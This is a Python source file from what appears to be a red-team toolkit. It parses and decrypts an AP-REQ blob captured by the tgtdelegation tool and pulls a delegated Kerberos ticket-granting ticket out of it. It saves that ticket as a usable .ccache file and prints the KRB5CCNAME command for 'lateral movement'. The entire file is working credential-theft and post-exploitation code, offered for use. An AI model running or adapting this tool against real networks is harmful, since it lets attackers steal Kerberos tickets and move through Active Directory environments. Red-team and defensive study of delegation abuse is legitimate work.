# tgtParse.py - Parse/decrypt tgtdelegation's AP-REQ response into a usable .ccache file for Kerberos lateral movement
# All credits go to dirkjanm (https://github.com/dirkjanm/krbrelayx/blob/master/lib/utils/kerberos.py)
# The TGTParse.py code was a refactor of the version available on Github : https://github.com/connormcgarr/tgtdelegation/tree/master, Author: Connor McGarr (@33y0re)


import sys
import struct
import argparse
import base64
import os

from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type import univ, namedtype, tag

from impacket.krb5 import types
from impacket.krb5.asn1 import AP_REQ, Authenticator, KRB_CRED, EncKrbCredPart
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.ccache import CCache, Header, Credential, KeyBlockV4, Times, CountedOctetString, Principal, Ticket
from impacket.krb5.types import KerberosTime

class GSSAPIHeader_KRB5_AP_REQ(univ.Sequence):
    tagSet = univ.Sequence.tagSet.tagImplicitly(tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 0))
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('tokenOid', univ.ObjectIdentifier()),
        # Actualy this is a constant 0x0001, but this decodes as an asn1 boolean
        namedtype.NamedType('krb5_ap_req', univ.Boolean()),
        namedtype.NamedType('apReq', AP_REQ()),
    )

class KrbCredCCache(CCache):
    """
    This is just the impacket ccache, but with an extra function to create it from
    a Krb Cred Ticket and ticket data
    """
    def fromKrbCredTicket(self, ticket, ticketdata):
        self.headers = []
        header = Header()
        header['tag'] = 1
        header['taglen'] = 8
        header['tagdata'] = b'\xff\xff\xff\xff\x00\x00\x00\x00'
        self.headers.append(header)
        tmpPrincipal = types.Principal()
        tmpPrincipal.from_asn1(ticketdata, 'prealm', 'pname')
        self.principal = Principal()
        self.principal.fromPrincipal(tmpPrincipal)
        encASRepPart = ticketdata
        credential = Credential()
        server = types.Principal()
        server.from_asn1(encASRepPart, 'srealm', 'sname')
        tmpServer = Principal()
        tmpServer.fromPrincipal(server)
        credential['client'] = self.principal
        credential['server'] = tmpServer
        credential['is_skey'] = 0
        credential['key'] = KeyBlockV4()
        credential['key']['keytype'] = int(encASRepPart['key']['keytype'])
        credential['key']['keyvalue'] = bytes(encASRepPart['key']['keyvalue'])
        credential['key']['keylen'] = len(credential['key']['keyvalue'])
        credential['time'] = Times()
        credential['time']['authtime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['starttime']))
        credential['time']['starttime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['starttime']))
        credential['time']['endtime'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['endtime']))
        credential['time']['renew_till'] = self.toTimeStamp(types.KerberosTime.from_asn1(encASRepPart['renew-till']))
        flags = self.reverseFlags(encASRepPart['flags'])
        credential['tktflags'] = flags
        credential['num_address'] = 0
        credential.ticket = CountedOctetString()
        credential.ticket['data'] = encoder.encode(ticket.clone(tagSet=Ticket.tagSet, cloneValueFlag=True))
        credential.ticket['length'] = len(credential.ticket['data'])
        credential.secondTicket = CountedOctetString()
        credential.secondTicket['data'] = b''
        credential.secondTicket['length'] = 0
        self.credentials.append(credential)

if __name__ == "__main__":
    # Parse the args
    parser = argparse.ArgumentParser(description='Parser to parse and decrypt the AP-REQ response from tgtdelegation to obtain a usable .ccache for lateral movement with Kerberos.', epilog='Example: python3 tgtParse.py --apreq APREQBLOBB64 --sessionkey SESSIONKEYBLOBB64 --etype AES256')

    # Add args
    parser.add_argument("--apreq", type=str, required=True, help='Base64 encoded AP-REQ output from tgtdelegation. Reference BOFs/Lateral Movement/README.md for more information.')
    parser.add_argument("--sessionkey", type=str, required=True, help='Base64 encoded Kerberos session key from tgtdelegation. Reference BOFs/Lateral Movement/README.md for more information.')
    parser.add_argument("--etype", type=str, required=True, help='Encryption type returned from tgtdelegation output. Reference BOFs/Lateral Movement/README.md for more information')
    args = parser.parse_args()


    # Base64 decode
    token = base64.b64decode(args.apreq)
    sessionKey = base64.b64decode(args.sessionkey)

    # Make sure we can parse the AP-REQ
    try:
        payload = decoder.decode(token, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except PyAsn1Error:
        raise Exception('Error obtaining Kerberos data')

    # Parse the AP-REQ
    decodedTGS = payload['apReq']

    encryptionType = args.etype
    # Get the encryption type from tgtdelegation and dynamically set it here
    # 18 = AES256
    # 17 = AES128
    # 23 = RC4
    if encryptionType == "AES256":
        etype = 18
    elif encryptionType == "AES128":
        etype = 17
    elif encryptionType == "RC4":
        etype = 23
    else:
        print("Could not determine the encryption type!")
        sys.exit()

    # Store the encryption key
    cipherText = decodedTGS['authenticator']['cipher']
    key = Key(etype, sessionKey)
    newCipher = _enctype_table[int(decodedTGS['authenticator']['etype'])]

    # Obtain plaintext from the Authenticator
    plainText = newCipher.decrypt(key, 11, cipherText)
    authenticator = decoder.decode(plainText, asn1Spec=Authenticator())[0]

    # Verify the checksum
    cksum = authenticator['cksum']
    if cksum['cksumtype'] != 32771:
        raise Exception('Checksum is not KRB5 type: %d' % cksum['cksumtype'])

    # Get the creds
    dlen = struct.unpack('<H', bytes(cksum['checksum'])[26:28])[0]
    deldata = bytes(cksum['checksum'])[28:28+dlen]
    creds = decoder.decode(deldata, asn1Spec=KRB_CRED())[0]
    newCipher = _enctype_table[int(creds['enc-part']['etype'])]
    plainText = newCipher.decrypt(key, 14, bytes(creds['enc-part']['cipher']))
    enc_part = decoder.decode(plainText, asn1Spec=EncKrbCredPart())[0]

    for i, tinfo in enumerate(enc_part['ticket-info']):
        username = '/'.join([str(item) for item in tinfo['pname']['name-string']])
        realm = str(tinfo['prealm'])
        fullname = '%s@%s' % (username, realm)
        print('\n[+] Identified ticket for', fullname)
        ticket = creds['tickets'][i]
        filename = fullname
        ccache = KrbCredCCache()
        ccache.fromKrbCredTicket(ticket, tinfo)
        try:
            ccache.saveFile(filename + '.ccache')
            print("[+] Successfully extracted the TGT! Saved as:", filename + '.ccache!')
            finalPath = os.path.abspath(filename + '.ccache')
            print("[*] Local path to usable .ccache:", finalPath)
            print("[*] Usage: export KRB5CCNAME="+finalPath)
        except Exception as fail:
            print(fail)
